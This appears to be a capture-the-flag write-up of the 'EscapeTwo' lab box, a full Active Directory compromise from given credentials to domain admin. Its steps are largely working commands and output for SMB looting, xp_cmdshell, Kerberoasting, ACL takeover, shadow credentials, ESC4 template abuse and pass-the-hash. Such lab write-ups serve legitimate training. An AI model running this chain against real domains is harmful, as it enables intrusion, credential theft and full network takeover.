# EscapeTwo - Work Log

## Assumed Breach Context
- Given creds: `rose` / `KxEPkKe6R8su`.
- Note: This is an assumed breach box, so initial auth checks (SMB/WinRM/MSSQL) are valid first moves.

---

## 1) Target Setup + Reachability
**Command**
```bash
echo "export IP=10.10.11.51" > ~/.ip
cat ~/.ip
ping -c 3 10.10.11.51
```
**Flags/Notes**
- `-c 3` sends 3 ICMP echo requests so I can confirm host is up without spamming.

**Why**
- Fast sanity check before heavier scans.

---

## 2) Full TCP Port Sweep
**Command**
```bash
nmap -p- --min-rate=3000 10.10.11.51 -Pn -oN EscapeTwo/logs/Escape2NmapOpenPorts.txt
```
**Flags/Notes**
- `-p-` scans all 65535 TCP ports.
- `--min-rate=3000` speeds up the scan (packets/sec), trading stealth for speed.
- `-Pn` skips host discovery (treats host as up).
- `-oN` writes normal output to file.

**Key Output** (`EscapeTwo/logs/Escape2NmapOpenPorts.txt`)
- Open ports: `53, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3268, 3269, 5985, 9389, 47001, 49664-49667, 49689-49690, 49693, 49706, 49722, 49743, 49798`.

**Decision**
- Looks like a Windows AD DC (LDAP/Kerberos/SMB/ADWS/WinRM) with MSSQL open; next step is version detection and domain context.

---

## 3) Service + Version Detection
**Command**
```bash
ports=$(awk '/^[0-9]+\/tcp/ {print $1}' EscapeTwo/logs/Escape2NmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)

nmap -p$ports -sSCV --min-rate=2000 10.10.11.51 -Pn -oN EscapeTwo/nmap/EscapeTwoNmapServicesVersions.txt
```
**Flags/Notes**
- `ports=$(...)` extracts open ports into a comma list.
- `-sS` SYN scan (default with root) for accuracy/speed.
- `-sC` runs default NSE scripts.
- `-sV` detects service versions.
- `--min-rate=2000` speeds up while keeping scripts stable.

**Key Output** (`EscapeTwo/nmap/EscapeTwoNmapServicesVersions.txt`)
- Domain: `sequel.htb` (from LDAP + cert SAN).
- Hostname: `DC01.sequel.htb`.
- MSSQL: `Microsoft SQL Server 2019 RTM` on `1433`.
- WinRM: `5985` and `47001`.

**Decision**
- We now know it is a DC for `sequel.htb`. With provided creds, SMB is the fastest path to gather files/creds.

---

## 4) SMB Enum with Given Creds
**Command**
```bash
smbclient -N -L //10.10.11.51
smbclient //10.10.11.51 -U "rose"

# confirmed auth and shares with nxc
nxc smb 10.10.11.51 -u rose -p "KxEPkKe6R8su" --shares
```
**Flags/Notes**
- `-N` uses anonymous auth (quick check for public shares).
- `-L` lists available shares.
- `-U` supplies a username.
- `nxc smb --shares` quickly validates creds and enumerates shares.

**Decision**
- Use valid creds to access non-default shares for loot.

---

## 5) SMB: Accounting Department Share
**Command**
```bash
smbclient //10.10.11.51/"Accounting Department" -U "rose"%"KxEPkKe6R8su"

# inside smbclient shell
ls
mget *
exit
```
**Flags/Notes**
- Share name has a space, so wrap it in quotes.
- `user%pass` is the smbclient inline password format.
- `mget *` downloads all files in the share.

**Key Output** (`logs/out.log` excerpt)
- Files found: `accounting_2024.xlsx`, `accounts.xlsx`.
- Downloads saved to: `EscapeTwo/loot/`.

**Decision**
- Excel files are high-value for credentials or hints. Extract content locally.

---

## 6) Local Analysis of XLSX Files
**Commands (attempts)**
```bash
xlsx2csv accounting_2024.xlsx
xlsx2csv accounts.xlsx
file accounts.xlsx
unzip accounts.xlsx
xmllint sharedStrings.xml
batcat sharedStrings.xml
```
**Notes**
- `.xlsx` files are ZIP containers of XML. `sharedStrings.xml` often holds cell text.
- `xlsx2csv` is a quick converter if file is valid.
- `file` verifies file signature.
- `unzip` and manual XML review are a fallback when converters fail.

**Outcome / Note**
- Files appeared corrupted; `xlsx2csv` and LibreOffice output was garbage.
- Manual XML review (`sharedStrings.xml`) is still useful for recovering data.

**Decision**
- Pivot from auto-conversion to manual XML extraction when XLSX is malformed.

---

## Evidence + Artifacts
- Nmap scan: `EscapeTwo/logs/Escape2NmapOpenPorts.txt`
- Service scan: `EscapeTwo/nmap/EscapeTwoNmapServicesVersions.txt`
- SMB loot: `EscapeTwo/loot/accounting_2024.xlsx`, `EscapeTwo/loot/accounts.xlsx`
- Full session output: `EscapeTwo/logs/out.log`
- Command timeline: `EscapeTwo/logs/cmd.log`

---

## 7) Credentials Extracted from XLSX

From `accounts.xlsx` → `xl/sharedStrings.xml`:

| User | Email | Password |
|------|-------|----------|
| angela | angela@sequel.htb | `0fwz7Q4mSpurIt99` |
| oscar | oscar@sequel.htb | `86LxLBMgEWaKUnBG` |
| kevin | kevin@sequel.htb | `Md9Wlq1E5bZnVDVo` |
| sa | sa@sequel.htb | `MSSQLP@ssw0rd!` |

**Extracted creds saved to:** `EscapeTwo/loot/accounts/xl/users.txt`

---

## 8) Credential Validation

**Commands**
```bash
nxc smb 10.10.11.51 -u angela -p '0fwz7Q4mSpurIt99'
nxc smb 10.10.11.51 -u oscar -p '86LxLBMgEWaKUnBG'
nxc smb 10.10.11.51 -u kevin -p 'Md9Wlq1E5bZnVDVo'
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
```

**Results**

| User | Service | Result |
|------|---------|--------|
| angela | SMB | `[-]` STATUS_LOGON_FAILURE |
| oscar | SMB | `[+]` Valid |
| kevin | SMB | `[-]` STATUS_LOGON_FAILURE |
| sa | MSSQL | `[+]` **Pwn3d!** (with `--local-auth`) |

**Decision**
- SA with sysadmin on MSSQL = foothold via `xp_cmdshell`.

---

## 9) MSSQL Foothold via xp_cmdshell

**Command**
```bash
impacket-mssqlclient sa:'MSSQLP@ssw0rd!'@10.10.11.51
```

**Enable xp_cmdshell**
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Result**
- Running as: `sequel\sql_svc`
- Privileges: Limited (no SeImpersonatePrivilege)

---

## 10) Enumeration as sql_svc

**User profiles on box:**
- Administrator
- ryan (target for user.txt)
- sql_svc

**sql_svc Desktop:** Empty - no user.txt

**Kerberoastable accounts found:**
```
CN=SQL Service,CN=Users,DC=sequel,DC=htb     → sequel.htb/sql_svc.DC01
CN=Certification Authority,CN=Users,DC=sequel,DC=htb → sequel.htb/ca_svc.DC01
```

**ADCS present:** Enterprise Root CA `sequel-DC01-CA`

---

## 11) Kerberoasting

**Command**
```bash
# Required clock sync first
sudo ntpdate 10.10.11.51

impacket-GetUserSPNs sequel.htb/oscar:'86LxLBMgEWaKUnBG' -dc-ip 10.10.11.51 -request
```

**Hashes obtained:**
- `sql_svc` - TGS hash captured
- `ca_svc` - TGS hash captured (priority target - member of Cert Publishers)

**Hashes saved to:** `EscapeTwo/loot/kerberoast.txt`

---

## 12) Kerberoast Cracking - Failed

**Command**
```bash
hashcat -m 13100 EscapeTwo/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

**Result:** Exhausted rockyou.txt - neither `sql_svc` nor `ca_svc` hashes cracked.

**Decision:** Pivot away from Kerberoasting to other enumeration paths.

---

## 13) ADCS Enumeration with Certipy

**Command**
```bash
certipy find -u oscar@sequel.htb -p '86LxLBMgEWaKUnBG' -dc-ip 10.10.11.51 -vulnerable -stdout
```

**Result:**
- CA found: `sequel-DC01-CA`
- Web enrollment: Disabled
- User Specified SAN: Disabled
- **No vulnerable certificate templates found**

**Decision:** Pivot to BloodHound for ACL-based attack paths.

---

## 14) BloodHound Enumeration

**Command**
```bash
bloodhound-python -u oscar -p '86LxLBMgEWaKUnBG' -d sequel.htb -ns 10.10.11.51 -c All --zip -o EscapeTwo/loot/
```

**Key Findings:**

| User | Notable Properties |
|------|-------------------|
| oscar | Member of: Accounting Department, Domain Users. No outbound control. |
| ryan | Member of: **Remote Management Users**, Management Department. **WriteOwner over ca_svc** |
| sql_svc | Member of: Domain Users, SQL groups. No outbound control. |
| ca_svc | Member of: **Cert Publishers**. Kerberoastable (but didn't crack). |

**Critical Discovery:**
- `ryan` has **WriteOwner** permission over `ca_svc`
- `ryan` is in **Remote Management Users** (can WinRM)
- No direct ACL path from oscar or sql_svc to ryan

**Attack Path Identified:**
```
??? → ryan → WriteOwner ca_svc → ADCS abuse → Domain Admin
```

**Evidence:** `EscapeTwo/evidence/ryan memberof outbound and inbound.png`, `EscapeTwo/evidence/sql_svc .png`

---

## 15) Credential Hunting via xp_cmdshell

Since BloodHound showed no ACL path to ryan, pivoted to filesystem credential hunting.

**Command**
```sql
EXEC xp_cmdshell 'type "C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"';
```

**Key Output:**
```ini
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SAPWD="MSSQLP@ssw0rd!"
```

**New credential found:** `sql_svc : WqSZAF6CysDQbGb3`

---

## 16) Password Reuse → ryan Shell

Tested the sql_svc password against ryan (password reuse).

**Command**
```bash
nxc winrm 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
```

**Result:** `[+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)`

**Shell obtained:**
```bash
evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
```

---

## 17) User Flag

```
type C:\Users\ryan\Desktop\user.txt
4a47439602ef6d09189d88bffe3be131
```

---

## 18) WriteOwner Abuse - Take Ownership of ca_svc

Ryan has WriteOwner permission over ca_svc, which allows taking ownership of the object.

**Command**
```bash
bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 set owner ca_svc ryan
```

**Flags/Notes**
- `set owner <target> <new_owner>` changes the object's owner
- Ownership grants implicit rights to modify the object's DACL

**Result:** Successfully made ryan the owner of ca_svc

---

## 19) Grant GenericAll for Full Control

Now that ryan owns ca_svc, grant full control permissions.

**Command**
```bash
bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --host 10.129.63.111 add genericAll ca_svc ryan
```

**Flags/Notes**
- `add genericAll` grants all permissions on the target object
- This allows changing passwords, modifying attributes, etc.

**Result:** Ryan now has full control over ca_svc account

---

## 20) Extract ca_svc NT Hash via Shadow Credentials

Instead of changing the password (which could break services), use certipy shadow to extract the NT hash.

**Command**
```bash
certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.129.63.111 -account ca_svc
```

**Flags/Notes**
- `shadow auto` abuses msDS-KeyCredentialLink attribute to add a key credential
- Extracts NT hash via Kerberos PKINIT authentication
- Non-destructive - doesn't change the actual password

**Result:** `ca_svc NT hash: 3b181b914e7a9d5508ea1e20bc2b7fce`

---

## 21) ESC4 Discovery - Vulnerable Certificate Template

With ca_svc access (member of Cert Publishers), enumerate ADCS for vulnerable templates.

**Command**
```bash
certipy find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -vulnerable
```

**Key Finding:**
```
Template Name: DunderMifflinAuthentication
Template Type: ESC4
Vulnerabilities:
  - Cert Publishers group has WriteDacl/WriteOwner/WriteProperty/GenericAll
  - Allows Cert Publishers to modify template configuration
  - Can enable dangerous flags like ENROLLEE_SUPPLIES_SUBJECT
```

**Decision:** ESC4 allows modifying template to enable arbitrary SPN/UPN requests

---

## 22) ESC4 Exploitation - Template Modification

Modify the DunderMifflinAuthentication template to allow requesting certificates as any user.

**Save current configuration:**
```bash
certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication -save-old
```

**Initial modification attempt (writes default with DNS requirement):**
```bash
certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication -write-default-configuration
```

**Problem:** Initial configuration set `msPKI-Certificate-Name-Flag: 1207959552` which includes the DNS requirement flag

**Manual JSON edit:**
```bash
vim DunderMifflinAuthentication.json
# Changed: "msPKI-Certificate-Name-Flag": 1207959552
# To:      "msPKI-Certificate-Name-Flag": 1
```

**Flags explained:**
- `1207959552` = Bitfield including ENROLLEE_SUPPLIES_SUBJECT + DNS_REQUIRED + other flags
- `1` = Only ENROLLEE_SUPPLIES_SUBJECT (allows specifying arbitrary UPN without DNS requirement)

**Apply modified configuration:**
```bash
certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -template DunderMifflinAuthentication -configuration DunderMifflinAuthentication.json
```

**Result:** Template now allows requesting certificates with arbitrary UPN, no DNS name required

**Evidence:** `EscapeTwo/DunderMifflinAuthentication.json`

---

## 23) Request Certificate as Administrator

With the modified template, request a certificate as administrator@sequel.htb.

**Command**
```bash
certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.63.111 -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

**Flags/Notes**
- `-ca sequel-DC01-CA` specifies the Certificate Authority
- `-template DunderMifflinAuthentication` uses our modified template
- `-upn administrator@sequel.htb` requests cert for Administrator account

**Result:** Successfully obtained `administrator.pfx` certificate

---

## 24) PKINIT Authentication → Administrator NT Hash

Use the certificate to authenticate via Kerberos PKINIT and extract the Administrator NT hash.

**Command**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.63.111
```

**Flags/Notes**
- `auth` performs PKINIT authentication using the certificate
- Retrieves NT hash and Kerberos TGT

**Result:** `Administrator NT hash: 7a8d4e04986afa8ed4060f75e5a0b3ff`

---

## 25) Administrator Shell + Root Flag

**Command**
```bash
evil-winrm -i 10.129.63.111 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

**Root flag:**
```
type C:\Users\Administrator\Desktop\root.txt
f6d2fc168461b54909f4e8b495aec471
```

---

## Credentials Summary

| User | Password/Hash | Access |
|------|---------------|--------|
| rose | KxEPkKe6R8su | SMB (given) |
| oscar | 86LxLBMgEWaKUnBG | SMB, LDAP |
| sa | MSSQLP@ssw0rd! | MSSQL sysadmin (local auth) |
| sql_svc | WqSZAF6CysDQbGb3 | MSSQL service account |
| ryan | WqSZAF6CysDQbGb3 | WinRM shell, WriteOwner on ca_svc |
| ca_svc | NT: 3b181b914e7a9d5508ea1e20bc2b7fce | Cert Publishers - ESC4 abuse |
| Administrator | NT: 7a8d4e04986afa8ed4060f75e5a0b3ff | Domain Admin - Root |

---

## Evidence + Artifacts
- Nmap scan: `EscapeTwo/logs/Escape2NmapOpenPorts.txt`
- Service scan: `EscapeTwo/nmap/EscapeTwoNmapServicesVersions.txt`
- SMB loot: `EscapeTwo/loot/accounting_2024.xlsx`, `EscapeTwo/loot/accounts.xlsx`
- Extracted creds: `EscapeTwo/loot/accounts/xl/users.txt`
- Kerberos hashes: `EscapeTwo/loot/kerberoast.txt`
- BloodHound data: `EscapeTwo/loot/*_bloodhound.zip`
- BloodHound screenshots: `EscapeTwo/evidence/*.png`
- Certificate template config: `EscapeTwo/DunderMifflinAuthentication.json`
- Administrator certificate: `EscapeTwo/administrator.pfx`
- Full session output: `EscapeTwo/logs/out.log`
- Command timeline: `EscapeTwo/logs/cmd.log`

---

## Lessons Learned

### Initial Access & Enumeration
- For assumed breach, authenticated SMB is the fastest path to loot.
- Corrupted XLSX still yields data if you extract and inspect XML by hand.
- Pulling domain context from LDAP + cert SANs helps build the right auth tests early.
- MSSQL SA with `--local-auth` can give sysadmin even when domain auth fails.
- Clock skew errors on Kerberos attacks → fix with `ntpdate <DC_IP>`.
- Service accounts in Cert Publishers group are high-value Kerberoast targets.

### Privilege Escalation - ACL Abuse
- **When Kerberoasting fails, pivot to BloodHound for ACL-based paths.**
- **SQL Server install configs (`sql-Configuration.INI`) often contain service account passwords.**
- **Password reuse between service accounts and users is common - always test credentials across accounts.**
- **WriteOwner is powerful: take ownership → grant yourself GenericAll → full control.**

### ADCS Exploitation - ESC4
- **ESC4 requires Cert Publishers group membership to modify certificate templates.**
- **certipy shadow is non-destructive** - extracts NT hash via msDS-KeyCredentialLink without changing passwords.
- **msPKI-Certificate-Name-Flag bitfield values:**
  - `1` = ENROLLEE_SUPPLIES_SUBJECT (allows arbitrary UPN)
  - `1207959552` = Includes DNS_REQUIRED flag (blocks arbitrary UPN without DNS name)
  - Manual JSON editing is needed when certipy defaults include unwanted flags
- **ESC4 attack chain:** WriteDacl/WriteProperty on template → modify flags → request cert as DA → PKINIT auth → NT hash
- **PKINIT authentication** (certipy auth) uses certificate to get Kerberos TGT and extract NT hash
- **Always save template backup before modifying** - use `-save-old` or manual copy
- **When cert requests fail with DNS errors**, check msPKI-Certificate-Name-Flag and remove DNS_REQUIRED bit

### Attack Chain Summary
```
SMB creds → MSSQL → xp_cmdshell → SQL config file → password reuse → ryan shell →
WriteOwner on ca_svc → bloodyAD takeover → certipy shadow → ca_svc hash →
ESC4 template modification → cert as Administrator → PKINIT → Admin hash → root
```
